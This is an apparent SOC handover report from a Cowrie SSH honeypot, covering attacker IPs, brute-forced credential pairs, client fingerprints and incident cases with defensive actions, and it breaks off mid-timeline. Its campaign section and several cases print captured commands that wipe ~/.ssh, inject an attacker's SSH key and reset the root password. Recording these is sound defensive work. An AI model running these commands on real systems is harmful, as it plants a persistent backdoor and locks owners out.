# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-25 |
| **Generated At** | 2026-08-25T18:45:10Z |
| **Shift Time** | 18:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **117** |
| Confirmed Threats | **106** |
| False Positives Filtered | **11** (9.4%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **19** |
| High Severity Cases | **52** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **2** HIGH · **20** MED · 22 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **58** |
| Unique Credential Pairs | **47** |
| Unique Usernames | **12** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **52** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `ubuntu` | 13 |
| `admin` | 3 |
| `support` | 3 |
| `345gs5662d34` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 4 |
| `` | 4 |
| `LeitboGi0ro` | 3 |
| `support` | 3 |
| `123@@@` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 4 |
| `root` | `LeitboGi0ro` | 3 |
| `admin` | `admin` | 3 |
| `support` | `support` | 3 |
| `root` | `123@@@` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `square@123` | `217.60.255.130` | 2026-08-25T15:00:05 |
| `root` | `)(*&^%$#@!` | `217.60.255.130` | 2026-08-25T15:00:09 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-25T15:04:00 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-25T15:04:00 |
| `root` | `Qaz!2345` | `194.164.59.59` | 2026-08-25T15:04:56 |
| `345gs5662d34` | `345gs5662d34` | `194.164.59.59` | 2026-08-25T15:04:59 |
| `root` | `3245gs5662d34` | `194.164.59.59` | 2026-08-25T15:05:00 |
| `ubuntu` | `olive@123` | `217.60.255.130` | 2026-08-25T15:09:37 |
| `root` | `System@1234` | `217.60.255.130` | 2026-08-25T15:09:41 |
| `admin` | `admin` | `171.231.179.237` | 2026-08-25T15:15:22 |
| `root` | `admin` | `171.231.179.237` | 2026-08-25T15:18:43 |
| `ubuntu` | `Shivam@123` | `217.60.255.130` | 2026-08-25T15:19:12 |
| `root` | `12345abcde` | `217.60.255.130` | 2026-08-25T15:19:16 |
| `andrew` | `1234` | `58.221.60.25` | 2026-08-25T15:21:31 |
| `installer` | `installer` | `171.231.179.237` | 2026-08-25T15:23:40 |
| `user` | `user` | `171.231.179.237` | 2026-08-25T15:26:19 |
| `ubuntu` | `Qwertyuiop@123` | `217.60.255.130` | 2026-08-25T15:28:50 |
| `root` | `P@ssw0rd!@#$%` | `217.60.255.130` | 2026-08-25T15:28:54 |
| `ubnt` | `ubnt` | `116.99.171.47` | 2026-08-25T15:33:21 |
| `ubuntu` | `cs@123` | `217.60.255.130` | 2026-08-25T15:38:12 |
| `squid` | `squid` | `116.99.171.47` | 2026-08-25T15:38:12 |
| `root` | `Dialog@123` | `217.60.255.130` | 2026-08-25T15:38:16 |
| `support` | `support` | `116.99.171.47` | 2026-08-25T15:47:36 |
| `ubuntu` | `rainbow@123` | `217.60.255.130` | 2026-08-25T15:47:56 |
| `root` | `123abc123` | `217.60.255.130` | 2026-08-25T15:48:00 |
| `root` | `@` | `116.99.171.47` | 2026-08-25T15:50:18 |
| `ubuntu` | `zymr@123` | `217.60.255.130` | 2026-08-25T15:57:23 |
| `root` | `password@123` | `217.60.255.130` | 2026-08-25T15:57:27 |
| `root` | `root123` | `116.99.171.47` | 2026-08-25T16:04:24 |
| `ubuntu` | `trading@123` | `217.60.255.130` | 2026-08-25T16:06:48 |
| `root` | `zaq!@wsx` | `217.60.255.130` | 2026-08-25T16:06:52 |
| `ubuntu` | `Copper@123` | `217.60.255.130` | 2026-08-25T16:16:25 |
| `root` | `a1234567` | `217.60.255.130` | 2026-08-25T16:16:28 |
| `root` | `123` | `207.46.224.87` | 2026-08-25T16:17:54 |
| `a` | `a` | `165.232.61.133` | 2026-08-25T16:19:11 |
| `support` | `support` | `176.53.159.196` | 2026-08-25T16:19:44 |
| `ubuntu` | `Babu@123` | `217.60.255.130` | 2026-08-25T16:25:58 |
| `root` | `Admin@123!` | `217.60.255.130` | 2026-08-25T16:26:01 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-25T16:29:09 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-25T16:29:11 |
| `ubuntu` | `p@s5w0rd` | `217.60.255.130` | 2026-08-25T16:35:20 |
| `root` | `aaa.123` | `217.60.255.130` | 2026-08-25T16:35:24 |
| `admin` | `admin` | `107.155.48.46` | 2026-08-25T16:41:06 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-25T16:41:08 |
| `support` | `support` | `10.0.0.73` | 2026-08-25T16:44:37 |
| `ubuntu` | `Saeed1404` | `217.60.255.130` | 2026-08-25T16:45:00 |
| `root` | `Passw0rd` | `217.60.255.130` | 2026-08-25T16:45:04 |
| `rstudio` | `12345678` | `103.187.147.0` | 2026-08-25T16:51:02 |
| `345gs5662d34` | `345gs5662d34` | `103.187.147.0` | 2026-08-25T16:51:06 |
| `rstudio` | `3245gs5662d34` | `103.187.147.0` | 2026-08-25T16:51:07 |
| `ubuntu` | `asd123ASD!@#` | `217.60.255.130` | 2026-08-25T16:54:34 |
| `root` | `asd123...` | `217.60.255.130` | 2026-08-25T16:54:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **117** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 39 |
| AsyncSSH (Python) | 10 |
| Go SSH scanner | 7 |
| Paramiko (Python) | 5 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `fda360b1b4f4...` | Mirai/variant | 10 | 2 |
| `a2de0f306611...` | Mirai/variant | 5 | 2 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `fda360b1b4f4...` | AsyncSSH (Python) | 10 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `a2de0f306611...` | Paramiko (Python) | 5 | 2 | Mirai/variant |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "1234\n3v7K9AYZd6Lv\n3v7K9AYZd6Lv"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `58.221.60.25`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `194.164.59.59`, `103.187.147.0`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **33** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14593` | Space Exploration Technologies Corporation | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS274222` | OMX Group S.A | 1 | MEDIUM |
| `AS138608` | Cloud Host Pte Ltd | 1 | HIGH |
| `AS10439` | CariNet, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (52)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-992279d525e5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:00 |
| **Last Seen** | 2026-08-25 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:00:04` | `cowrie.session.connect` |
| `2026-08-25 15:00:04` | `cowrie.client.version` |
| `2026-08-25 15:00:04` | `cowrie.client.kex` |
| `2026-08-25 15:00:05` | `cowrie.login.success` |
| `2026-08-25 15:00:05` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:00:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:00:06` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f18f43c7d0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:00 |
| **Last Seen** | 2026-08-25 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:00:08` | `cowrie.session.connect` |
| `2026-08-25 15:00:08` | `cowrie.client.version` |
| `2026-08-25 15:00:09` | `cowrie.client.kex` |
| `2026-08-25 15:00:09` | `cowrie.login.success` |
| `2026-08-25 15:00:10` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:00:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:00:10` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea91e6c153fc

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-25 15:03 |
| **Last Seen** | 2026-08-25 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:03:59` | `cowrie.session.connect` |
| `2026-08-25 15:03:59` | `cowrie.client.version` |
| `2026-08-25 15:03:59` | `cowrie.client.kex` |
| `2026-08-25 15:04:00` | `cowrie.login.success` |
| `2026-08-25 15:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca97752394a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-25 15:03 |
| **Last Seen** | 2026-08-25 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:03:59` | `cowrie.session.connect` |
| `2026-08-25 15:03:59` | `cowrie.client.version` |
| `2026-08-25 15:03:59` | `cowrie.client.kex` |
| `2026-08-25 15:04:00` | `cowrie.login.success` |
| `2026-08-25 15:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeba56152280

| Field | Detail |
|---|---|
| **Source IP** | `194.164.59[.]59` |
| **First Seen** | 2026-08-25 15:04 |
| **Last Seen** | 2026-08-25 15:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:04:56` | `cowrie.session.connect` |
| `2026-08-25 15:04:56` | `cowrie.client.version` |
| `2026-08-25 15:04:56` | `cowrie.client.kex` |
| `2026-08-25 15:04:56` | `cowrie.login.success` |
| `2026-08-25 15:04:57` | `cowrie.session.params` |
| `2026-08-25 15:04:57` | `cowrie.command.input` |
| `2026-08-25 15:04:57` | `cowrie.command.failed` |
| `2026-08-25 15:04:57` | `cowrie.log.closed` |
| `2026-08-25 15:04:58` | `cowrie.session.params` |
| `2026-08-25 15:04:58` | `cowrie.command.input` |
| `2026-08-25 15:04:58` | `cowrie.session.file_download` |
| `2026-08-25 15:04:58` | `cowrie.log.closed` |
| `2026-08-25 15:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.59[.]59` to AbuseIPDB if not already reported
- [ ] Block `194.164.59[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1080b11b3e8c

| Field | Detail |
|---|---|
| **Source IP** | `194.164.59[.]59` |
| **First Seen** | 2026-08-25 15:04 |
| **Last Seen** | 2026-08-25 15:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:04:58` | `cowrie.session.connect` |
| `2026-08-25 15:04:59` | `cowrie.client.version` |
| `2026-08-25 15:04:59` | `cowrie.client.kex` |
| `2026-08-25 15:04:59` | `cowrie.login.success` |
| `2026-08-25 15:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.59[.]59` to AbuseIPDB if not already reported
- [ ] Block `194.164.59[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54e575a9867c

| Field | Detail |
|---|---|
| **Source IP** | `194.164.59[.]59` |
| **First Seen** | 2026-08-25 15:04 |
| **Last Seen** | 2026-08-25 15:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:04:59` | `cowrie.session.connect` |
| `2026-08-25 15:04:59` | `cowrie.client.version` |
| `2026-08-25 15:04:59` | `cowrie.client.kex` |
| `2026-08-25 15:05:00` | `cowrie.login.success` |
| `2026-08-25 15:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.59[.]59` to AbuseIPDB if not already reported
- [ ] Block `194.164.59[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c08a295dcac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:09 |
| **Last Seen** | 2026-08-25 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:09:36` | `cowrie.session.connect` |
| `2026-08-25 15:09:36` | `cowrie.client.version` |
| `2026-08-25 15:09:36` | `cowrie.client.kex` |
| `2026-08-25 15:09:37` | `cowrie.login.success` |
| `2026-08-25 15:09:37` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:09:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:09:37` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-589f79e34b02

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:09 |
| **Last Seen** | 2026-08-25 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:09:40` | `cowrie.session.connect` |
| `2026-08-25 15:09:40` | `cowrie.client.version` |
| `2026-08-25 15:09:40` | `cowrie.client.kex` |
| `2026-08-25 15:09:41` | `cowrie.login.success` |
| `2026-08-25 15:09:41` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:09:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:09:42` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158281bbec66

| Field | Detail |
|---|---|
| **Source IP** | `171.231.179[.]237` |
| **First Seen** | 2026-08-25 15:15 |
| **Last Seen** | 2026-08-25 15:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:15:20` | `cowrie.session.connect` |
| `2026-08-25 15:15:20` | `cowrie.client.version` |
| `2026-08-25 15:15:21` | `cowrie.client.kex` |
| `2026-08-25 15:15:22` | `cowrie.login.success` |
| `2026-08-25 15:15:23` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:15:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:15:24` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.179[.]237` to AbuseIPDB if not already reported
- [ ] Block `171.231.179[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933f299fc993

| Field | Detail |
|---|---|
| **Source IP** | `171.231.179[.]237` |
| **First Seen** | 2026-08-25 15:18 |
| **Last Seen** | 2026-08-25 15:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:18:40` | `cowrie.session.connect` |
| `2026-08-25 15:18:40` | `cowrie.client.version` |
| `2026-08-25 15:18:42` | `cowrie.client.kex` |
| `2026-08-25 15:18:43` | `cowrie.login.success` |
| `2026-08-25 15:18:44` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:18:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:18:44` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.179[.]237` to AbuseIPDB if not already reported
- [ ] Block `171.231.179[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aecd07ee356

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:19 |
| **Last Seen** | 2026-08-25 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:19:11` | `cowrie.session.connect` |
| `2026-08-25 15:19:11` | `cowrie.client.version` |
| `2026-08-25 15:19:12` | `cowrie.client.kex` |
| `2026-08-25 15:19:12` | `cowrie.login.success` |
| `2026-08-25 15:19:13` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:19:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:19:13` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d27fd18ac5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:19 |
| **Last Seen** | 2026-08-25 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:19:15` | `cowrie.session.connect` |
| `2026-08-25 15:19:15` | `cowrie.client.version` |
| `2026-08-25 15:19:15` | `cowrie.client.kex` |
| `2026-08-25 15:19:16` | `cowrie.login.success` |
| `2026-08-25 15:19:17` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:19:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:19:17` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727b12074290

| Field | Detail |
|---|---|
| **Source IP** | `58.221.60[.]25` |
| **First Seen** | 2026-08-25 15:21 |
| **Last Seen** | 2026-08-25 15:26 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "1234\n3v7K9AYZd6Lv\n3v7K9AYZd6Lv"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:21:29` | `cowrie.session.connect` |
| `2026-08-25 15:21:30` | `cowrie.client.version` |
| `2026-08-25 15:21:30` | `cowrie.client.kex` |
| `2026-08-25 15:21:31` | `cowrie.login.success` |
| `2026-08-25 15:21:32` | `cowrie.session.params` |
| `2026-08-25 15:21:32` | `cowrie.command.input` |
| `2026-08-25 15:21:32` | `cowrie.command.failed` |
